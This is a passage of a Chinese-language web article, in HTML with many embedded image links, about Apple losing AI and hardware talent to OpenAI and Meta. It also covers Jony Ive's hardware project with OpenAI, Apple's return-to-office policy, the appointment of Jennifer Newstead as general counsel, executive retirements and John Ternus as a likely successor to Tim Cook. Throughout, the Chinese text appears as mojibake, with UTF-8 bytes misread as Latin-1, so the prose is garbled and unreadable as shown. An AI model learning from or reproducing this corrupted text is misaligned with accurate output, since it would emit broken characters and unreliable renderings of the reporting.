<p>ä»–çš„ç¦»å¼€ï¼Œç›´æ¥å¯¼è‡´äº†è‹¹æœå¤§æ¨¡å‹ç ”å‘è¿›åº¦çš„åœæ»ã€‚</p>
<p>è€Œåƒ Tom Gunterã€Frank Chu è¿™æ ·çš„æ ¸å¿ƒéª¨å¹²ï¼Œä¹Ÿçº·çº·è½¬æŠ• Meta æˆ– OpenAIã€‚</p>
<p>è¿™ç§æµåŠ¨ï¼Œåƒæ˜¯ä¸€ç§ã€Œä¿¡ä»°çš„æ”¹å®—ã€ã€‚</p>
<p>åœ¨è¿™ä¸ª AI å®šä¹‰æœªæ¥çš„æ—¶ä»£ï¼Œå·¥ç¨‹å¸ˆä»¬æ›´æ„¿æ„å»ä¸€ä¸ªå°† AI è§†ä¸ºæ ¸å¿ƒäº§å“ã€è§†ä¸ºã€Œç¥ã€çš„åœ°æ–¹ï¼Œè€Œä¸æ˜¯ä¸€ä¸ªå°† AI è§†ä¸ºã€Œè®© iPhone æ‹ç…§æ›´å¥½çœ‹ã€çš„è¾…åŠ©åŠŸèƒ½éƒ¨é—¨ã€‚</p>
<h2 data-id="heading-1">ç¬¬å››ç« ï¼šå¹½çµå¤ä»‡â€”â€”ä¹”çº³æ£® Â· ä¼Šå¤«çš„å½±å­å¸å›½</h2>
<p>è‹¹æœçš„äººæ‰æµå¤±ä¸ä»…ä»…æ˜¯åˆ†æ•£çš„ï¼Œè¿˜æœ‰ä¸€ä¸ªæœ‰ç»„ç»‡çš„ã€Œæ¥æ”¶ç«¯ã€ï¼Œé‚£å°±æ˜¯å‰é¦–å¸­è®¾è®¡å®˜ä¹”çº³æ£® Â· ä¼Šå¤«ï¼ˆJony Iveï¼‰ä¸ OpenAI CEO å¥¥ç‰¹æ›¼çš„è”æ‰‹ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9ddb69ff61994f7a8879a26df6476d4c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765767189&amp;x-signature=%2BhZ%2BG8e9D4SNOrpYByfx4YWfx8Q%3D" alt="" loading="lazy"/></p>
<p><strong>ã€Œ<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bcaa1074ee7e4965975ab7f70803b0f4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765767189&amp;x-signature=ZewSpjzq%2FpZADtJn7CDcugA6WVs%3D" alt="" loading="lazy"/>ã€</strong></p>
<p><strong>ã€Œ4.1 ã€Œæ—§çˆ±ã€çš„å¬å”¤ã€</strong></p>
<p>è™½ç„¶ä¼Šå¤«å·²ç»ç¦»å¼€è‹¹æœå¤šå¹´ï¼Œä½†ä»–åœ¨è‹¹æœè®¾è®¡å›¢é˜Ÿä¸­çš„ç²¾ç¥å›¾è…¾åœ°ä½ä¾ç„¶ç¨³å›ºã€‚</p>
<p>ç°åœ¨ï¼Œä»–æ­£åœ¨é€šè¿‡ä¸ OpenAI çš„åˆä½œï¼Œé‡æ–°å¬é›†æ—§éƒ¨ã€‚</p>
<p>æ®ã€Šçº½çº¦æ—¶æŠ¥ã€‹ç­‰åª’ä½“æŠ¥é“ï¼Œä¼Šå¤«çš„ç‹¬ç«‹è®¾è®¡å…¬å¸ LoveFrom æ­£åœ¨ä¸ OpenAI æ·±åº¦åˆä½œï¼Œå¼€å‘ä¸€æ¬¾è¢«ç§°ä¸ºã€ŒAI æ—¶ä»£çš„ iPhoneã€çš„ç¡¬ä»¶è®¾å¤‡ã€‚</p>
<p>ä¸ºäº†è¿™ä¸ªé¡¹ç›®ï¼Œä¼Šå¤«ä¸ä»…å¸¦èµ°äº†ä»–åœ¨è‹¹æœçš„è€æ­æ¡£ Tang Tanï¼ˆå‰ iPhone äº§å“è®¾è®¡å‰¯æ€»è£ï¼‰ï¼Œè¿˜å¼€å§‹ç³»ç»Ÿæ€§åœ°æŒ–è§’è‹¹æœçš„ç¡¬ä»¶å·¥ç¨‹å›¢é˜Ÿã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/11f0971f255f44b5b62559a322accbd2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765767189&amp;x-signature=Rxax4BeKbR1tQPqwY9HlA7ttCTs%3D" alt="" loading="lazy"/></p>
<p><strong>ã€Œ<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7d8afd88ab334168bbd76047e4aa3281~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765767189&amp;x-signature=SpMm4XHTPcWBViryEefFqp5NupI%3D" alt="" loading="lazy"/>ã€</strong></p>
<p><strong>ã€Œ4.2 é™ç»´æ‰“å‡»ã€</strong></p>
<p>è¿™ä¸€åŠ¨ä½œå¯¹è‹¹æœæ„æˆäº†åŒé‡æ‰“å‡»ã€‚</p>
<p><strong>ã€Œä¸€æ–¹é¢ï¼Œäººæ‰è¢«æŠ½å–ã€‚ã€</strong></p>
<p>ä¼Šå¤«å¸¦èµ°çš„ä¸æ˜¯å†™ä»£ç çš„è½¯ä»¶å·¥ç¨‹å¸ˆï¼Œè€Œæ˜¯é‚£äº›æœ€æ‡‚å¾—å¦‚ä½•å°†å¤æ‚çš„ç¡…èŠ¯ç‰‡ã€æ•£çƒ­æ¨¡ç»„å’Œç”µæ± å°è£…è¿›æç®€ç»ç’ƒé“åˆé‡‘å¤–å£³é‡Œçš„**ã€Œé¡¶çº§ç¡¬ä»¶å·¥åŒ ã€**ã€‚è¿™æ˜¯è‹¹æœæœ€å¼•ä»¥ä¸ºå‚²ã€ä¹Ÿæœ€éš¾å¤åˆ¶çš„èµ„äº§ã€‚</p>
<p><strong>ã€Œå¦ä¸€æ–¹é¢ï¼Œè·¯çº¿å›¾è¢«æˆªæ€ã€‚ã€</strong></p>
<p>è‹¹æœä¹Ÿåœ¨ç ”å‘ AI ç¡¬ä»¶ï¼ˆå¦‚æ™ºèƒ½çœ¼é•œã€å¸¦å±å¹•çš„ HomePodã€ç”šè‡³æ˜¯æ¡Œé¢æœºå™¨äººï¼‰ã€‚ä½†ä¼Šå¤«å’Œå¥¥ç‰¹æ›¼çš„è”ç›Ÿï¼Œæ„å‘³ç€å¸‚åœºä¸Šå°†å‡ºç°ä¸€ä¸ªæ—¢æ‹¥æœ‰ ChatGPT å¤§è„‘ï¼Œåˆæ‹¥æœ‰è‹¹æœçº§å®¡ç¾å’Œå·¥è‰ºçš„æ–°ç‰©ç§ã€‚</p>
<p>å¯¹äºé‚£äº›åœ¨è‹¹æœå†…éƒ¨æ„Ÿåˆ°æ†‹å±ˆçš„ç¡¬ä»¶å·¥ç¨‹å¸ˆæ¥è¯´ï¼Œå» OpenAI é€ ä¸€ä¸ªã€Œæ²¡æœ‰å±å¹•ã€å®Œå…¨è¯­éŸ³äº¤äº’ã€ç”šè‡³èƒ½ç†è§£æƒ…æ„Ÿã€çš„æ–°è®¾å¤‡ï¼Œå¬èµ·æ¥æ¯”æ¯å¹´ç»™ iPhone æŒªåŠ¨æ‘„åƒå¤´çš„ä½ç½®ã€æŠŠè¾¹æ¡†å†ç¼©çª„ 0.5 æ¯«ç±³è¦æœ‰è¶£å¾—å¤šã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5fd44188359941779a183ae60ee1a3c2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765767189&amp;x-signature=Jh7dYRG8mFF3nlZDL9qjXnGW71o%3D" alt="" loading="lazy"/></p>
<p><strong>ã€Œç¬¬äº”ç« ï¼šé‡‘æ‰‹é“çš„æ–­è£‚ã€</strong></p>
<p><strong>ã€Œä¸å¼ºåˆ¶è¿”å²—çš„åå™¬ã€</strong></p>
<p>é™¤äº†å®å¤§çš„æ„¿æ™¯å’ŒæŠ€æœ¯è·¯çº¿ä¹‹äº‰ï¼Œæ¨å€’å¤šç±³è¯ºéª¨ç‰Œçš„è¿˜æœ‰æ›´ç°å®çš„å› ç´ ï¼šåŠå…¬æ”¿ç­–ä¸è–ªé…¬ç»“æ„ã€‚</p>
<p><strong>ã€Œ<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/12b1bf002f954b18800b64083db30b7d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765767189&amp;x-signature=xy5g6NbWRgN76QHkageRvvbQKkk%3D" alt="" loading="lazy"/>ã€</strong></p>
<p><strong>ã€Œ5.1 å¼ºåˆ¶è¿”å²—ï¼ˆRTOï¼‰çš„å‚²æ…¢ã€</strong></p>
<p>åº“å…‹ä¸€ç›´åšä¿¡ã€ŒSerendipityã€ï¼ˆæ„å¤–ä¹‹å–œï¼‰æ¥è‡ªäºé¢å¯¹é¢çš„äº¤æµï¼Œå› æ­¤è‹¹æœæ˜¯ç¡…è°·å·¨å¤´ä¸­å¯¹ RTOï¼ˆReturn to Officeï¼‰æ”¿ç­–æ‰§è¡Œæœ€åšå†³ã€æœ€ä¸å¦¥åçš„å…¬å¸ä¹‹ä¸€ã€‚</p>
<p>è‹¹æœè¦æ±‚å‘˜å·¥æ¯å‘¨è‡³å°‘ä¸‰å¤©ï¼ˆé€šå¸¸æ˜¯å‘¨ä¸€ã€å‘¨äºŒã€å‘¨å››ï¼‰å¿…é¡»åœ¨åŠå…¬å®¤ã€‚</p>
<p>ç„¶è€Œï¼Œå¯¹äºä¹ æƒ¯äº†è¿œç¨‹å·¥ä½œçš„ AI ç ”ç©¶å‘˜å’Œè½¯ä»¶å·¥ç¨‹å¸ˆæ¥è¯´ï¼Œå¼ºåˆ¶å›åˆ°åº“æ¯”è’‚è¯ºæ‰“å¡ä¸ä»…æ˜¯ä¸€ç§é€šå‹¤çš„æŠ˜ç£¨ï¼ˆæ¹¾åŒºçš„äº¤é€šå·²æˆå™©æ¢¦ï¼‰ï¼Œæ›´æ˜¯ä¸€ç§ä¸è¢«ä¿¡ä»»çš„ä¿¡å·ã€‚</p>
<p>ä¸€ä½å·²ç¦»èŒçš„è‹¹æœé«˜çº§æœºå™¨å­¦ä¹ å·¥ç¨‹å¸ˆåœ¨ Blind ä¸Šåæ§½ï¼šã€Œæˆ‘åœ¨å®¶é‡Œèƒ½ç”¨ 12 å°æ—¶ä¸“æ³¨è®­ç»ƒæ¨¡å‹ï¼Œä½†åœ¨ Apple Parkï¼Œæˆ‘å¾—èŠ± 2 å°æ—¶é€šå‹¤ï¼Œç„¶ååœ¨å¼€æ”¾å¼åŠå…¬åŒºé‡Œæˆ´ç€é™å™ªè€³æœºå‡è£…è‡ªå·±ä¸åœ¨åœºã€‚è¿™ä¸ä»…æ˜¯æ•ˆç‡é—®é¢˜ï¼Œæ›´æ˜¯å°Šä¸¥é—®é¢˜ã€‚ã€</p>
<p>ç›¸æ¯”ä¹‹ä¸‹ï¼Œå¾ˆå¤šåˆåˆ›å…¬å¸å’Œç”šè‡³åƒ Airbnbã€Atlassian è¿™æ ·çš„å…¬å¸æä¾›äº†ã€Œéšå¤„å·¥ä½œã€çš„é€‰é¡¹ã€‚å³ä¾¿æ˜¯æ‰§è¡Œ RTO çš„ Metaï¼Œå…¶æ–‡åŒ–ä¹Ÿç›¸å¯¹çµæ´»ã€‚</p>
<p>å½“ä¸€åèµ„æ·±çš„ ML å·¥ç¨‹å¸ˆå‘ç°ä»–å¯ä»¥åœ¨å¤ªæµ©æ¹–ï¼ˆLake Tahoeï¼ŒmacOS 26 å› æ­¤å¾—åï¼‰çš„åˆ«å¢…é‡Œä¸º OpenAI å†™ä»£ç ï¼Œè€Œä¸å¿…åœ¨ 101 å…¬è·¯ä¸Šå µè½¦æ—¶ï¼Œç¦»èŒä¿¡å°±å·²ç»åœ¨é…é…¿ä¸­äº†ã€‚</p>
<p><strong>ã€Œ<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e38d3d0dafc1404888f4e963eff6d583~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765767189&amp;x-signature=lQxpAQjzSxHyJNECtlgPxGzvsH0%3D" alt="" loading="lazy"/>ã€</strong></p>
<p><strong>ã€Œ5.2 è‚¡ä»·çš„å¼•åŠ›å¤±æ•ˆã€</strong></p>
<p>é•¿æœŸä»¥æ¥ï¼Œè‹¹æœçš„ RSUï¼ˆå—é™è‚¡ç¥¨å•ä½ï¼‰è¢«ç§°ä¸ºç¡…è°·çš„ã€Œé‡‘æ‰‹é“ã€ã€‚</p>
<p>ä½†éšç€è‹¹æœå¸‚å€¼çªç ´ 3.5 ä¸‡äº¿ç¾å…ƒï¼Œå…¶å¢é•¿ç©ºé—´åœ¨å¾ˆå¤šå‘˜å·¥çœ¼ä¸­å·²ç»è§é¡¶ã€‚</p>
<p>ã€Œå¦‚æœä½ åœ¨ 2010 å¹´åŠ å…¥è‹¹æœï¼Œä½ æ˜¯åœ¨åç«ç®­ï¼›å¦‚æœä½ åœ¨ 2025 å¹´åŠ å…¥ï¼Œä½ æ˜¯åœ¨åæ¸¸è½®ã€‚ã€</p>
<p>ç›¸æ¯”ä¹‹ä¸‹ï¼ŒOpenAIã€SpaceX æˆ–è€…æ˜¯è¢« AI é‡æ–°ç‚¹ç‡ƒçš„ Metaï¼Œå…¶æ½œåœ¨çš„æœŸæƒå¢å€¼å€æ•°è¦å¤§å¾—å¤šã€‚</p>
<p>OpenAI çš„ä¼°å€¼åœ¨çŸ­çŸ­å‡ å¹´å†…ä»å‡ åäº¿é£™å‡è‡³åƒäº¿ç¾é‡‘ï¼Œè¿™ç§æŒ‡æ•°çº§çš„è´¢å¯Œæ•ˆåº”ï¼Œå¯¹äºæ¸´æœ›è´¢åŠ¡è‡ªç”±çš„å¹´è½»ä¸€ä»£å¤©æ‰æ¥è¯´ï¼Œæ¯”è‹¹æœç¨³å¥ä½†ç¼“æ…¢çš„å¢é•¿è¦è¯±äººå¾—å¤šã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1441afcc13b944fc9cf07f2badde636a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765767189&amp;x-signature=jRsgwY7mf3VYcCVEqppT1OfoWQI%3D" alt="" loading="lazy"/></p>
<p><strong>ã€Œç¬¬å…­ç« ï¼šåå‘æ“ä½œã€</strong></p>
<p><strong>ã€Œè‹¹æœçš„æ³•å¾‹å ¡å’ä¸é˜²å¾¡ã€</strong></p>
<p>å½“ç„¶ï¼Œè‹¹æœå¹¶æ²¡æœ‰åä»¥å¾…æ¯™ã€‚</p>
<p>åœ¨è¿™åœºäººæ‰æˆ˜äº‰ä¸­ï¼Œåº“å…‹å±•ç°äº†ä»–ä½œä¸ºé¡¶çº§æˆ˜æœ¯å®¶çš„ä¸€é¢ï¼šåœ¨æŠ€æœ¯é˜²çº¿åƒç´§æ—¶ï¼Œé€šè¿‡æ³•å¾‹æ‰‹æ®µåŠ å›ºåŸå¢™ã€‚</p>
<p><strong>ã€Œ<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/51d2ce83af644498b6263c1b5f78739e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765767189&amp;x-signature=I3bYHijpWRbyP%2BWSiB0oacCiT6w%3D" alt="" loading="lazy"/>ã€</strong></p>
<p><strong>ã€Œ6.1 è©¹å¦®å¼— Â· çº½æ–¯ç‰¹å¾·çš„åŠ ç›Ÿï¼šä»¥æ¯’æ”»æ¯’ã€</strong></p>
<p>å°±åœ¨è‹¹æœäººæ‰å¤–æµæœ€ä¸¥é‡çš„æ—¶åˆ»ï¼Œåº“å…‹å®Œæˆäº†ä¸€æ¬¡æ¼‚äº®çš„ã€ŒåæŒ–è§’ã€ã€‚</p>
<p>è‹¹æœå®£å¸ƒè˜è¯· Meta çš„é¦–å¸­æ³•åŠ¡å®˜è©¹å¦®å¼— Â· çº½æ–¯ç‰¹å¾·ï¼ˆJennifer Newsteadï¼‰æ‹…ä»»ä¸‹ä¸€ä»»æ€»æ³•å¾‹é¡¾é—®ï¼Œæ¥æ›¿å³å°†é€€ä¼‘çš„å‡¯ç‘Ÿç³ Â· äºšå½“æ–¯ï¼ˆKatherine Adamsï¼‰ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9a077d84d3174ab2b40b6dc426389f05~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765767189&amp;x-signature=T%2BuInTuiKu6v5jzYkL%2BF1EQ%2BI2E%3D" alt="" loading="lazy"/></p>
<p>è¿™æ˜¯ä¸€æ¬¡æå…·æˆ˜ç•¥æ„ä¹‰ã€ç”šè‡³å¸¦æœ‰æŸç§é»‘è‰²å¹½é»˜çš„ä»»å‘½ã€‚</p>
<p>çº½æ–¯ç‰¹å¾·åœ¨ Meta çš„æœ€å¤§æˆ˜ç»©ï¼Œå°±æ˜¯åˆšåˆšå¸®åŠ©å…¬å¸åœ¨ FTCï¼ˆè”é‚¦è´¸æ˜“å§”å‘˜ä¼šï¼‰çš„åå„æ–­è¯‰è®¼ä¸­å–å¾—äº†æ ‡å¿—æ€§çš„èƒœåˆ©ï¼Œä¿ä½äº† Instagram å’Œ WhatsApp ä¸è¢«æ‹†åˆ†ã€‚</p>
<p>å¥¹è¢«èª‰ä¸ºåç››é¡¿æœ€å¼ºç¡¬çš„æ³•å¾‹æ–—å£«ä¹‹ä¸€ï¼Œæ‹¥æœ‰å‰å›½åŠ¡é™¢æ³•å¾‹é¡¾é—®å’Œã€Šçˆ±å›½è€…æ³•æ¡ˆã€‹èµ·è‰è€…çš„æ·±åšèƒŒæ™¯ã€‚</p>
<p><strong>ã€Œ<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7e2bc2ebaab74b858bbdfa7f39b951fc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765767189&amp;x-signature=HNweN7lfuv3TiEAnLJnbv5sUj%2FA%3D" alt="" loading="lazy"/>ã€</strong></p>
<p><strong>ã€Œ6.2 ç”Ÿå­˜ä¹‹æˆ˜ä¼˜å…ˆã€</strong></p>
<p>æ­¤åˆ»çš„è‹¹æœï¼Œæ­£é¢ä¸´ç€ç¾å›½å¸æ³•éƒ¨ï¼ˆDOJï¼‰å‘èµ·çš„å²æ— å‰ä¾‹çš„åå„æ–­è¯‰è®¼ï¼ŒæŒ‡æ§å…¶éæ³•å„æ–­æ™ºèƒ½æ‰‹æœºå¸‚åœºï¼Œå¹¶è¯•å›¾æ‹†è§£è‹¹æœçš„ã€Œå›´å¢™èŠ±å›­ã€ã€‚</p>
<p>åœ¨æ¬§ç›Ÿï¼Œè‹¹æœçš„ App Store å•†ä¸šæ¨¡å¼ä¹Ÿå·²è¢«ã€Šæ•°å­—å¸‚åœºæ³•æ¡ˆã€‹ï¼ˆDMAï¼‰æ‰“å¾—åƒç–®ç™¾å­”ã€‚</p>
<p>è‹¹æœæŒ–æ¥çº½æ–¯ç‰¹å¾·ï¼Œæ½œå°è¯éå¸¸æ˜ç¡®ï¼š<strong>ã€Œæˆ‘ä»¬å¯èƒ½åœ¨ã€</strong> <strong>ã€ŒAIã€</strong> <strong>ã€Œä¸Šæš‚æ—¶è½åï¼Œä½†åœ¨ç”Ÿå­˜ä¹‹æˆ˜ï¼ˆåå„æ–­ï¼‰ä¸Šï¼Œæˆ‘ä»¬å¿…é¡»èµ¢ã€‚ã€</strong></p>
<p>åªè¦ä¿ä½äº† App Store çš„æ§åˆ¶æƒå’Œ iPhone çš„ç”Ÿæ€å£å’ï¼Œè‹¹æœå°±æœ‰è¶³å¤Ÿçš„ç°é‡‘æµå»é€šè¿‡æ”¶è´­æˆ–ç ”å‘æ…¢æ…¢è¿½èµ¶ AIã€‚</p>
<p>è¿™æ˜¾ç¤ºäº†åº“å…‹ä½œä¸ºè¿è¥å¤§å¸ˆçš„åŠ¡å®ï¼šåœ¨åˆ›æ–°å—é˜»æ—¶ï¼Œä¼˜å…ˆç¡®ä¿æŠ¤åŸæ²³ä¸è¢«ç›‘ç®¡æ”»ç ´ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/49b8aacf7c4b4f84ab1dc230e89991ac~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765767189&amp;x-signature=sq8FtEhplJvUokur1%2Fx6Lbn%2FUa0%3D" alt="" loading="lazy"/></p>
<p><strong>ã€Œç¬¬ä¸ƒç« ï¼šç‹åº§çš„äº¤æ¥ã€</strong></p>
<p><strong>ã€Œçº¦ç¿° Â· ç‰¹åŠªæ–¯ä¸åº“å…‹çš„é»„æ˜ã€</strong></p>
<p>æ‰€æœ‰çš„äººäº‹åŠ¨è¡ï¼Œæœ€ç»ˆéƒ½æŒ‡å‘äº†ä¸€ä¸ªæ ¸å¿ƒé—®é¢˜ï¼š<strong>ã€ŒæƒåŠ›çš„æ›´è¿­ã€</strong>ã€‚</p>
<p><strong>ã€Œ<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/caff8c9af13147a7b0da7d76f39a3dac~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765767189&amp;x-signature=8xWkIx5v%2FomUT4hIAn4u514eIDU%3D" alt="" loading="lazy"/>ã€</strong></p>
<p><strong>ã€Œ7.1 åº“å…‹æ—¶ä»£çš„å†…é˜è§£æ•£ã€</strong></p>
<p>2025 å¹´è‡³ 2026 å¹´ï¼Œè‹¹æœçš„æ ¸å¿ƒç®¡ç†å±‚è¿æ¥äº†ä¸€æ¬¡å½»åº•çš„æ¢è¡€ã€‚</p>
<p>è¿™æˆ–è®¸æ˜¯æ•´ä¸ªã€Œåº“å…‹å†…é˜ã€çš„è°¢å¹•ï¼š</p>
<ul>
<li>**å‡¯ç‘Ÿç³ Â· äºšå½“æ–¯ï¼ˆKatherine Adamsï¼‰ï¼š**æ€»æ³•å¾‹é¡¾é—®ï¼Œé€€ä¼‘ã€‚</li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bafa8591623d41f5b8b43f8120b4469f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765767189&amp;x-signature=qye%2Ban9w8Hct5GOXGN9fMw82skw%3D" alt="" loading="lazy"/></p>
<ul>
<li>**ä¸½è Â· æ°å…‹é€Šï¼ˆLisa Jacksonï¼‰ï¼š**æ›¾ä»»å¥¥å·´é©¬æ”¿åºœç¯ä¿ç½²ç½²é•¿ï¼Œè´Ÿè´£ç¯å¢ƒä¸æ”¿ç­–çš„é«˜çº§å‰¯æ€»è£ï¼Œé€€ä¼‘ã€‚</li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8e2e2fbfe1d6495cbe17fa86d7db58e7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765767189&amp;x-signature=apQ8higdBivgYj3qfKLCZ4Ugibc%3D" alt="" loading="lazy"/></p>
<ul>
<li>**æ°å¤« Â· å¨å»‰å§†æ–¯ï¼ˆJeff Williamsï¼‰ï¼š**é¦–å¸­è¿è¥å®˜ï¼Œæ›¾ç»æœ€åƒåº“å…‹çš„æ¥ç­äººï¼Œå¦‚ä»Šå·²å¹´è¿‡å…­æ—¬ï¼Œè™½ç„¶æœªå®Œå…¨ç¦»å¼€ï¼Œä½†å…¶è§’è‰²æ­£åœ¨è¾¹ç¼˜åŒ–ï¼ŒæƒåŠ›æ­£åœ¨ä¸‹æ”¾ã€‚</li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4ac6d416128141a9936e7001ffd7b12a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765767189&amp;x-signature=eBqi1ktWK%2FacyomTLIAQDmFmwL4%3D" alt="" loading="lazy"/></p>
<ul>
<li>**è²å°” Â· å¸­å‹’ï¼ˆPhil Schillerï¼‰ï¼š**App Store çš„æŒé—¨äººï¼Œè™½ç„¶æŒ‚ç€ã€ŒApple Fellowã€çš„å¤´è¡”ï¼Œä½†å…¶å®é™…å½±å“åŠ›æ­£åœ¨å‡å¼±ã€‚</li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3f17be0625104225b9c345d5ad3f3b9c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765767189&amp;x-signature=YSndYZluyF2zu7DwNHBd2pb0zW8%3D" alt="" loading="lazy"/></p>
<p>è¿™ä¸€è¿ä¸²çš„åå­—åŠ åœ¨ä¸€èµ·ï¼Œæ„å‘³ç€ç»´æŒäº†è‹¹æœè¿‡å»åå¹´ã€Œè¶…çº§ç¨³å®šã€å±€é¢çš„æƒåŠ›æ¶æ„æ­£åœ¨è§£ä½“ã€‚</p>
<p><strong>ã€Œ<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/de308dc30fac4c9e9cfb3ff3e7d5f71a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765767189&amp;x-signature=yHZMyvpO%2Bm41TSH%2BHPTaC5Ap1v8%3D" alt="" loading="lazy"/>ã€</strong></p>
<p><strong>ã€Œ7.2 çº¦ç¿° Â· ç‰¹åŠªæ–¯ï¼šè¢«é€‰ä¸­çš„ã€Œå¥½å­©å­ã€ã€</strong></p>
<p>åœ¨æ‰€æœ‰å¯èƒ½çš„ç»§ä»»è€…ä¸­ï¼Œç¡¬ä»¶å·¥ç¨‹é«˜çº§å‰¯æ€»è£çº¦ç¿° Â· ç‰¹åŠªæ–¯ï¼ˆJohn Ternusï¼‰æˆä¸ºäº†é¢†è·‘è€…ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/de148b69b60940e5892ced7234884538~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765767189&amp;x-signature=CxG%2BNG9AsYqJtxIi4hudg3HMGjg%3D" alt="" loading="lazy"/></p>
<p>æ ¹æ® Polymarket çš„é¢„æµ‹ï¼Œä»–æ¥ç­åº“å…‹çš„æ¦‚ç‡é«˜è¾¾ 55%ã€‚</p>
<p>ç‰¹åŠªæ–¯ç°å¹´ 50 å²ï¼Œå¹´è½»ã€è‹±ä¿Šã€æåº¦ç†æ™ºã€‚</p>
<p>ä»–åœ¨è‹¹æœå†…éƒ¨ä»¥å–„äºåˆä½œã€æƒ…ç»ªç¨³å®šã€æ³¨é‡ç»†èŠ‚è‘—ç§°ã€‚</p>
<p>æœ‰ä¸€ä¸ªå¹¿ä¸ºæµä¼ çš„æ•…äº‹æ˜¯ï¼šæ—©å¹´ä¸ºäº†æ£€æŸ¥ iMac æ˜¾ç¤ºå™¨èƒŒåçš„èºä¸çº¹è·¯ï¼Œä»–æ›¾åœ¨æ·±å¤œæ‹¿ç€æ”¾å¤§é•œä¸ä¾›åº”å•†äº‰æ‰§ï¼Œå› ä¸ºä¾›åº”å•†åšäº† 25 é“çº¹è·¯ï¼Œè€Œè‹¹æœè®¾è®¡çš„æ˜¯ 35 é“ã€‚</p>
<p>è¿™ç§å¯¹ç»†èŠ‚çš„åæ‰§æ·±å—åº“å…‹èµè¯†ã€‚</p>
<p>ä½†é—®é¢˜åœ¨äºï¼Œç‰¹åŠªæ–¯å¤ªåƒåº“å…‹äº†ã€‚</p>
